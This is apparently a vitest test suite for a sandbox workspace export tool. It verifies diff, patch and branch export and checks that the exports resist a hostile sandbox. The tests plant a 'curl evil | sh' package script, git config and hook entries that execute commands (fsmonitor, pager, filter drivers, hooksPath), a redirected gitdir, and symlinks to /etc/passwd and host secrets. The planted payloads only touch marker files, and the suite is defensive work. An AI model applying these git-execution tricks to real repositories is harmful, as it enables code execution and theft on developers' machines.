import {
  chmod,
  cp,
  mkdir,
  readFile,
  readdir,
  rename,
  rm,
  symlink,
  writeFile,
} from 'node:fs/promises';
import { spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { exportWorkspace } from '../export.js';
import { prepareWorkspace } from '../prepare.js';
import type { ExportFormat, WorkspaceRecord } from '../types.js';
import {
  FakeProvider,
  git,
  headOf,
  makeRepo,
  porcelain,
  tmp,
  useTempCleanup,
  write,
} from './helpers.js';

useTempCleanup();

const common = { access: 'rw' as const, remote: false, sandboxPath: '/workspace' };
const SB = 'local/ab12cd34';

interface Ctx {
  root: string;
  src: string;
  sandboxDir: string;
  record: WorkspaceRecord;
  /** The "sandbox tree" the fake provider returns (copy/clone/sync), or the live tree. */
  tree: string;
  provider: FakeProvider;
  tmpDir: string;
}

async function setup(
  mode: 'copy' | 'clone' | 'worktree' | 'mount' | 'sync',
  exclude?: string[],
): Promise<Ctx> {
  const root = await tmp();
  const src = await makeRepo(join(root, 'project'));
  const sandboxDir = join(root, 'sandboxes', 'ab12cd34');
  const r = await prepareWorkspace({
    ...common,
    mode,
    source: src,
    sandboxDir,
    ...(exclude ? { exclude } : {}),
  });
  let tree: string;
  if (r.record.liveTree) tree = r.record.liveTree;
  else {
    tree = join(root, 'sandbox-tree');
    await cp(join(sandboxDir, 'staging'), tree, { recursive: true, verbatimSymlinks: true });
  }
  return {
    root,
    src,
    sandboxDir,
    record: r.record,
    tree,
    provider: new FakeProvider(tree),
    tmpDir: join(root, 'export-tmp'),
  };
}

function run(ctx: Ctx, format: ExportFormat, extra: Record<string, unknown> = {}) {
  return exportWorkspace({
    record: ctx.record,
    provider: ctx.provider,
    sandboxId: SB,
    format,
    tmpDir: ctx.tmpDir,
    ...extra,
  });
}

async function applyCheck(
  ctx: Ctx,
  content: string,
  how: 'apply' | 'am' = 'apply',
): Promise<string> {
  // apply the result onto a pristine checkout of the source commit
  const dir = await tmp('abox-apply-');
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, 'fetch', '-q', ctx.src, 'HEAD');
  git(dir, 'checkout', '-q', 'FETCH_HEAD');
  const patch = join(dir, '..', `x-${Math.random().toString(36).slice(2)}.patch`);
  await writeFile(patch, content);
  if (how === 'apply') git(dir, 'apply', '--index', patch);
  else git(dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'am', patch);
  return dir;
}

describe('export: normal changes', () => {
  it('copy mode: diff, patch, files with statuses and flags', async () => {
    const ctx = await setup('copy');
    const t = ctx.tree;
    await write(join(t, 'src/a.txt'), 'alpha\nBETA\ngamma\n');
    await rm(join(t, 'src/b.txt'));
    await write(join(t, 'src/new.txt'), 'new file\n');
    await write(join(t, 'tool.sh'), '#!/bin/sh\necho hi\n', 0o755);
    await chmod(join(t, 'tool.sh'), 0o755);
    await write(join(t, '.envrc'), 'export X=1\n');
    await write(join(t, '.github/workflows/ci.yml'), 'on: push\n');
    await write(join(t, 'Makefile'), 'all:\n\techo\n');
    await write(
      join(t, 'package.json'),
      JSON.stringify({ name: 'demo', scripts: { test: 'curl evil | sh', postinstall: 'x' } }),
    );
    await write(join(t, 'bin.dat'), Buffer.from([0, 1, 2, 3, 255, 254]));
    await symlink('/etc/passwd', join(t, 'etc-link'));
    await symlink('src/a.txt', join(t, 'ok-link'));
    await chmod(join(t, 'README.md'), 0o755);

    const diff = await run(ctx, 'diff');
    expect(diff.content).toContain('diff --git a/src/a.txt b/src/a.txt');
    expect(diff.content).toContain('-beta');
    expect(diff.content).toContain('deleted file mode 100644');
    expect(diff.content).toContain('new file mode 120000');
    expect(diff.content).toContain('GIT binary patch');
    const byPath = Object.fromEntries(diff.files.map((f) => [f.path, f]));
    expect(byPath['src/a.txt']).toMatchObject({
      status: 'modified',
      kind: 'file',
      insertions: 2,
      deletions: 1,
    });
    expect(byPath['src/b.txt']).toMatchObject({ status: 'deleted' });
    expect(byPath['src/new.txt']).toMatchObject({ status: 'added' });
    expect(byPath['bin.dat']).toMatchObject({ status: 'added', binary: true });
    expect(byPath['etc-link']).toMatchObject({ kind: 'symlink', symlinkTarget: '/etc/passwd' });
    expect(diff.stats.filesChanged).toBe(diff.files.length);

    const reasons = (p: string) =>
      diff.flagged
        .filter((f) => f.path === p)
        .map((f) => f.reason)
        .join(' | ');
    expect(reasons('.envrc')).toMatch(/direnv/);
    expect(reasons('.github/workflows/ci.yml')).toMatch(/CI workflow/);
    expect(reasons('Makefile')).toMatch(/Makefile/);
    expect(reasons('package.json')).toMatch(/scripts/);
    expect(reasons('tool.sh')).toMatch(/executable file added/);
    expect(reasons('tool.sh')).toMatch(/shell script/);
    expect(reasons('etc-link')).toMatch(/outside the workspace/);
    expect(reasons('ok-link')).toBe('');
    expect(reasons('README.md')).toMatch(/executable bit set/);
    expect(reasons('README.md')).toMatch(/mode changed/);
    expect(reasons('src/a.txt')).toBe('');

    // the diff applies cleanly to the original commit
    const applied = await applyCheck(ctx, diff.content as string);
    expect(await readFile(join(applied, 'src/a.txt'), 'utf8')).toBe('alpha\nBETA\ngamma\n');
    expect(existsSync(join(applied, 'src/b.txt'))).toBe(false);

    const patch = await run(ctx, 'patch');
    expect(patch.content).toContain('Subject: [PATCH] abox export from local/ab12cd34');
    expect(patch.content).toContain('From 0000000000000000000000000000000000000000');
    const amDir = await applyCheck(ctx, patch.content as string, 'am');
    expect(git(amDir, 'log', '-1', '--format=%s').trim()).toBe('abox export from local/ab12cd34');

    const files = await run(ctx, 'files');
    expect(files.content).toBeUndefined();
    expect(files.files.map((f) => f.path).sort()).toEqual(diff.files.map((f) => f.path).sort());
  });

  it('detects renames and honours paths filter', async () => {
    const ctx = await setup('copy');
    await rename(join(ctx.tree, 'src/a.txt'), join(ctx.tree, 'src/renamed.txt'));
    await write(join(ctx.tree, 'other.txt'), 'other\n');
    const all = await run(ctx, 'files');
    expect(all.files.find((f) => f.path === 'src/renamed.txt')).toMatchObject({
      status: 'renamed',
      oldPath: 'src/a.txt',
    });
    const some = await run(ctx, 'diff', { paths: ['other.txt'] });
    expect(some.files.map((f) => f.path)).toEqual(['other.txt']);
    expect(some.content).not.toContain('renamed');
    await expect(run(ctx, 'diff', { paths: ['../x'] })).rejects.toMatchObject({
      code: 'invalid_input',
    });
    await expect(run(ctx, 'diff', { paths: ['/etc'] })).rejects.toMatchObject({
      code: 'invalid_input',
    });
  });

  it('no changes -> empty result; default excludes node_modules', async () => {
    const ctx = await setup('copy');
    expect((await run(ctx, 'diff')).files).toEqual([]);
    expect((await run(ctx, 'diff')).content).toBe('');
    await write(join(ctx.tree, 'node_modules/pkg/index.js'), 'x');
    const r = await run(ctx, 'files');
    expect(r.files).toEqual([]);
    expect(r.stats.excluded).toBe(1);
    const r2 = await run(ctx, 'files', { exclude: [] });
    expect(r2.files.map((f) => f.path)).toEqual(['node_modules/pkg/index.js']);
  });

  it('files format writes changed regular files to outDir, never links', async () => {
    const ctx = await setup('copy');
    await write(join(ctx.tree, 'src/new/deep.txt'), 'deep\n');
    await symlink('/etc/passwd', join(ctx.tree, 'lnk'));
    const out = join(ctx.root, 'out');
    const r = await run(ctx, 'files', { outDir: out });
    expect(r.written).toEqual(['src/new/deep.txt']);
    expect(await readFile(join(out, 'src/new/deep.txt'), 'utf8')).toBe('deep\n');
    expect(existsSync(join(out, 'lnk'))).toBe(false);
    await expect(run(ctx, 'files', { outDir: out })).rejects.toMatchObject({ code: 'conflict' });
  });

  it('enforces tree limits', async () => {
    const ctx = await setup('copy');
    await expect(run(ctx, 'diff', { limits: { maxEntries: 3 } })).rejects.toMatchObject({
      code: 'invalid_input',
    });
  });

  it('empty workspace exports everything as added', async () => {
    const root = await tmp();
    const r = await prepareWorkspace({ ...common, mode: 'empty', sandboxDir: join(root, 'sb') });
    const tree = join(root, 'tree');
    await write(join(tree, 'x.txt'), 'x\n');
    const res = await exportWorkspace({
      record: r.record,
      provider: new FakeProvider(tree),
      sandboxId: SB,
      format: 'patch',
      tmpDir: join(root, 't'),
    });
    expect(res.files).toMatchObject([{ path: 'x.txt', status: 'added' }]);
    expect(res.content).toContain('new file mode');
    await expect(
      exportWorkspace({
        record: r.record,
        provider: new FakeProvider(tree),
        sandboxId: SB,
        format: 'branch',
        tmpDir: join(root, 't'),
      }),
    ).rejects.toMatchObject({ code: 'unsupported' });
  });

  it('cleans its scratch directory', async () => {
    const ctx = await setup('copy');
    await write(join(ctx.tree, 'n.txt'), 'n');
    await run(ctx, 'diff');
    expect(await readdir(ctx.tmpDir)).toEqual([]);
  });
});

describe('export: branch', () => {
  for (const mode of ['clone', 'copy', 'worktree', 'mount'] as const) {
    it(`${mode}: creates abox/<short>-export in the source without touching its tree or HEAD`, async () => {
      const ctx = await setup(mode);
      await write(join(ctx.tree, 'src/a.txt'), 'alpha\nchanged\n');
      await write(join(ctx.tree, 'added.txt'), 'added\n');
      if (mode === 'mount') {
        // the mounted source IS the live tree: keep a pristine reference of HEAD to compare against
      }
      const head = headOf(ctx.src);
      const statusBefore = mode === 'mount' ? undefined : porcelain(ctx.src);
      const branchBefore = git(ctx.src, 'branch', '--show-current');

      const r = await run(ctx, 'branch');
      expect(r.branch).toBe('abox/ab12cd34-export');
      expect(git(ctx.src, 'rev-parse', 'abox/ab12cd34-export').trim()).toBe(r.commit);
      expect(git(ctx.src, 'show', 'abox/ab12cd34-export:src/a.txt')).toBe('alpha\nchanged\n');
      expect(git(ctx.src, 'show', 'abox/ab12cd34-export:added.txt')).toBe('added\n');
      expect(git(ctx.src, 'rev-parse', 'abox/ab12cd34-export~1').trim()).toBe(head);
      expect(git(ctx.src, 'fsck', '--no-dangling', '--strict')).toBeDefined();
      expect(headOf(ctx.src)).toBe(head);
      expect(git(ctx.src, 'branch', '--show-current')).toBe(branchBefore);
      if (statusBefore !== undefined) expect(porcelain(ctx.src)).toBe(statusBefore);
      if (mode === 'mount') expect(porcelain(ctx.src)).toContain('added.txt'); // untouched by export, only our own edits remain

      // refuses to overwrite, unless forced
      await expect(run(ctx, 'branch')).rejects.toMatchObject({ code: 'conflict' });
      await write(join(ctx.tree, 'more.txt'), 'more\n');
      const forced = await run(ctx, 'branch', { force: true });
      expect(forced.commit).not.toBe(r.commit);
      expect(git(ctx.src, 'show', 'abox/ab12cd34-export:more.txt')).toBe('more\n');
      expect(headOf(ctx.src)).toBe(head);
    });
  }

  it('rejects unsafe branch names', async () => {
    const ctx = await setup('copy');
    await write(join(ctx.tree, 'n.txt'), 'n');
    await expect(run(ctx, 'branch', { branchName: '--force' })).rejects.toMatchObject({
      code: 'invalid_input',
    });
    await expect(run(ctx, 'branch', { branchName: 'a..b' })).rejects.toMatchObject({
      code: 'invalid_input',
    });
  });

  it('no changes creates no branch', async () => {
    const ctx = await setup('clone');
    const r = await run(ctx, 'branch');
    expect(r.branch).toBeUndefined();
    expect(git(ctx.src, 'branch', '--list', 'abox/*').trim()).toBe('');
  });
});

describe('export: hostile sandbox', () => {
  const marks = async (ctx: Ctx) => {
    const names = [
      'fsmonitor',
      'pager',
      'filter-clean',
      'hook',
      'textconv',
      'diffdriver',
      'attacker-hook',
      'attacker-fsmonitor',
    ];
    return Object.fromEntries(
      names.map((n) => [n, join(ctx.root, `pwned-${n}-${Math.random().toString(36).slice(2)}`)]),
    );
  };

  async function armClone(ctx: Ctx, m: Record<string, string>): Promise<void> {
    const t = ctx.tree;
    // (a) git config with fsmonitor / pager / external diff, (b) filter driver + attributes, (e) hook
    await write(
      join(t, '.git/config'),
      [
        '[core]',
        `\tfsmonitor = touch ${m['fsmonitor']}`,
        `\tpager = touch ${m['pager']}`,
        `\thooksPath = ${join(t, '.git/hooks')}`,
        '[diff "evil"]',
        `\ttextconv = touch ${m['textconv']} #`,
        `\tcommand = touch ${m['diffdriver']}`,
        '[filter "evil"]',
        `\tclean = touch ${m['filter-clean']}; cat`,
        `\tsmudge = touch ${m['filter-clean']}; cat`,
        '[alias]',
        `\tdiff = !touch ${m['pager']}`,
        '',
      ].join('\n'),
    );
    await write(join(t, '.gitattributes'), '* filter=evil diff=evil\n');
    await write(join(t, '.git/info/attributes'), '* filter=evil diff=evil\n');
    await write(join(t, '.git/hooks/post-checkout'), `#!/bin/sh\ntouch ${m['hook']}\n`, 0o755);
    await write(join(t, '.git/hooks/pre-commit'), `#!/bin/sh\ntouch ${m['hook']}\n`, 0o755);
    await chmod(join(t, '.git/hooks/post-checkout'), 0o755);
    await chmod(join(t, '.git/hooks/pre-commit'), 0o755);
    // also change a tracked file so that diff machinery has work to do
    await write(join(t, 'src/a.txt'), 'alpha\nevil\n');
  }

  it('clone/copy: sandbox .git config, hooks and attributes never execute; symlinks stay links', async () => {
    for (const mode of ['clone', 'copy'] as const) {
      const ctx = await setup(mode);
      const m = await marks(ctx);
      await armClone(ctx, m);
      const hostSecret = join(ctx.root, 'host-secret.txt');
      await writeFile(hostSecret, 'HOST-SECRET-DATA-xyz');
      // (d) symlinks to a system file, a host file and a host directory
      await symlink('/etc/passwd', join(ctx.tree, 'out'));
      await symlink(hostSecret, join(ctx.tree, 'secret-link'));
      await symlink('/etc', join(ctx.tree, 'etc-dir'));
      await symlink('../../..', join(ctx.tree, 'src', 'up'));
      // nested .git and .GIT lookalikes
      await write(
        join(ctx.tree, 'sub/.git/config'),
        '[core]\n\tfsmonitor = touch /nonexistent/x\n',
      );
      await mkdir(join(ctx.tree, 'GIT~1'), { recursive: true });
      await write(join(ctx.tree, 'GIT~1/x'), 'x');
      await write(join(ctx.tree, 'evil\u001b[31mname.txt'), 'x');
      await symlink('/etc/passwd', join(ctx.tree, '.gitmodules'));

      for (const format of ['diff', 'patch', 'files', 'branch'] as const) {
        const r = await run(ctx, format, { branchName: `abox/test-${mode}-${format}` });
        const text = r.content ?? '';
        expect(text).not.toContain('root:');
        expect(text).not.toContain('HOST-SECRET-DATA');
        const byPath = Object.fromEntries(r.files.map((f) => [f.path, f]));
        expect(byPath['out']).toMatchObject({
          status: 'added',
          kind: 'symlink',
          symlinkTarget: '/etc/passwd',
        });
        expect(byPath['secret-link']).toMatchObject({ kind: 'symlink', symlinkTarget: hostSecret });
        expect(byPath['etc-dir']).toMatchObject({ kind: 'symlink' });
        expect(r.files.some((f) => f.path.startsWith('etc-dir/'))).toBe(false);
        expect(
          r.files.some((f) => f.path.startsWith('sub/.git') || f.path.startsWith('GIT~1')),
        ).toBe(false);
        expect(r.files.some((f) => f.path === '.gitmodules')).toBe(false);
        expect(r.files.some((f) => f.path.startsWith('.git/'))).toBe(false);
        const flaggedPaths = r.flagged.map((f) => f.path);
        expect(flaggedPaths).toEqual(
          expect.arrayContaining([
            'out',
            'secret-link',
            'etc-dir',
            'src/up',
            '.git/hooks/post-checkout',
            '.git/hooks/pre-commit',
            '.git/config',
            'sub/.git',
            'GIT~1',
            '.gitmodules',
            '.gitattributes',
          ]),
        );
        expect(
          r.flagged.some((f) => f.path.includes('evil') && /control characters/.test(f.reason)),
        ).toBe(true);
        if (format === 'branch') {
          expect(git(ctx.src, 'show', `abox/test-${mode}-branch:out`)).toBe('/etc/passwd');
          expect(
            git(ctx.src, 'ls-tree', '-r', '--name-only', `abox/test-${mode}-branch`),
          ).not.toContain('.git/');
        }
      }
      for (const p of Object.values(m)) expect(existsSync(p)).toBe(false);
    }
  });

  it('mount: in-place tampering of .git/config and hooks is reported, nothing runs', async () => {
    const ctx = await setup('mount');
    const m = await marks(ctx);
    const t = ctx.tree;
    await write(
      join(t, '.git/config'),
      (await readFile(join(t, '.git/config'), 'utf8')) +
        `[core]\n\tfsmonitor = touch ${m['fsmonitor']}\n\tpager = touch ${m['pager']}\n`,
    );
    await write(join(t, '.git/hooks/post-checkout'), `#!/bin/sh\ntouch ${m['hook']}\n`, 0o755);
    await chmod(join(t, '.git/hooks/post-checkout'), 0o755);
    await write(join(t, '.gitattributes'), '* filter=evil\n');
    await write(join(t, 'src/a.txt'), 'alpha\nmount-edit\n');
    for (const format of ['diff', 'patch', 'files', 'branch'] as const) {
      const r = await run(ctx, format);
      expect(r.files.map((f) => f.path).sort()).toEqual(['.gitattributes', 'src/a.txt']);
      expect(r.flagged.map((f) => f.path)).toEqual(
        expect.arrayContaining(['.git/config', '.git/hooks/post-checkout']),
      );
      expect(r.flagged.find((f) => f.path === '.git/config')?.reason).toMatch(/fsmonitor/);
    }
    for (const p of Object.values(m)) expect(existsSync(p)).toBe(false);
  });

  it('mount: replaced .git directory is refused', async () => {
    const ctx = await setup('mount');
    const m = await marks(ctx);
    await rename(join(ctx.tree, '.git'), join(ctx.root, 'moved-git'));
    await write(join(ctx.tree, '.git/HEAD'), 'ref: refs/heads/main\n');
    await write(join(ctx.tree, '.git/config'), `[core]\n\tfsmonitor = touch ${m['fsmonitor']}\n`);
    await mkdir(join(ctx.tree, '.git/objects'));
    await expect(run(ctx, 'diff')).rejects.toMatchObject({
      code: 'policy_denied',
      details: { tampered: true },
    });
    expect(existsSync(m['fsmonitor'] as string)).toBe(false);
  });

  it('worktree: replaced .git file pointing to an attacker gitdir is refused (and never used)', async () => {
    const ctx = await setup('worktree');
    const m = await marks(ctx);
    const attacker = join(ctx.root, 'attacker.git');
    await mkdir(join(attacker, 'hooks'), { recursive: true });
    await mkdir(join(attacker, 'objects'), { recursive: true });
    await write(join(attacker, 'HEAD'), 'ref: refs/heads/main\n');
    await write(
      join(attacker, 'config'),
      `[core]\n\tfsmonitor = touch ${m['attacker-fsmonitor']}\n\thooksPath = ${join(attacker, 'hooks')}\n`,
    );
    await write(
      join(attacker, 'hooks/post-checkout'),
      `#!/bin/sh\ntouch ${m['attacker-hook']}\n`,
      0o755,
    );
    await chmod(join(attacker, 'hooks/post-checkout'), 0o755);
    await writeFile(join(ctx.tree, '.git'), `gitdir: ${attacker}\n`);
    await write(join(ctx.tree, 'src/a.txt'), 'alpha\nwt-edit\n');

    for (const format of ['diff', 'patch', 'files', 'branch'] as const) {
      await expect(run(ctx, format)).rejects.toMatchObject({
        code: 'policy_denied',
        details: { tampered: true },
      });
    }
    // explicit override: .git still ignored, result flagged
    const r = await run(ctx, 'diff', { allowTamperedGit: true });
    expect(r.flagged.find((f) => f.path === '.git')?.reason).toMatch(/TAMPERED/);
    expect(r.files.map((f) => f.path)).toEqual(['src/a.txt']);
    for (const p of Object.values(m)) expect(existsSync(p)).toBe(false);

    // .git replaced by a symlink to the attacker dir
    await rm(join(ctx.tree, '.git'));
    await symlink(attacker, join(ctx.tree, '.git'));
    await expect(run(ctx, 'diff')).rejects.toMatchObject({ code: 'policy_denied' });
    expect(existsSync(m['attacker-hook'] as string)).toBe(false);
    expect(existsSync(m['attacker-fsmonitor'] as string)).toBe(false);
  });

  it('worktree: untouched .git file passes and the live tree is exported', async () => {
    const ctx = await setup('worktree');
    await write(join(ctx.tree, 'src/a.txt'), 'alpha\nfine\n');
    await symlink('/etc/passwd', join(ctx.tree, 'pw'));
    const r = await run(ctx, 'diff');
    expect(r.files.map((f) => f.path).sort()).toEqual(['pw', 'src/a.txt']);
    expect(r.content).not.toContain('root:');
  });

  it('tree swapped for a symlink to a host directory does not leak host files', async () => {
    const ctx = await setup('copy');
    const hostDir = join(ctx.root, 'hostdir');
    await write(join(hostDir, 'private.txt'), 'PRIVATE-HOST-DATA');
    await rm(join(ctx.tree, 'src'), { recursive: true });
    await symlink(hostDir, join(ctx.tree, 'src'));
    const r = await run(ctx, 'patch');
    expect(r.content).not.toContain('PRIVATE-HOST-DATA');
    expect(r.files.find((f) => f.path === 'src')).toMatchObject({ kind: 'symlink' });
    expect(
      r.files
        .filter((f) => f.status === 'deleted')
        .map((f) => f.path)
        .sort(),
    ).toEqual(['src/a.txt', 'src/b.txt']);
  });

  it('rejects a provider that does not produce a directory', async () => {
    const ctx = await setup('copy');
    const bad = { copyOut: async () => undefined };
    await expect(
      exportWorkspace({
        record: ctx.record,
        provider: bad,
        sandboxId: SB,
        format: 'diff',
        tmpDir: ctx.tmpDir,
      }),
    ).rejects.toMatchObject({ code: 'backend_error' });
  });

  it('patch output applies with git apply --check (sanity of binary/symlink handling)', async () => {
    const ctx = await setup('clone');
    await write(join(ctx.tree, 'x.bin'), Buffer.from([0, 255, 0, 255, 1]));
    await symlink('target', join(ctx.tree, 'l'));
    const r = await run(ctx, 'diff');
    const res = spawnSync('true');
    expect(res.status).toBe(0);
    await applyCheck(ctx, r.content as string);
  });
});
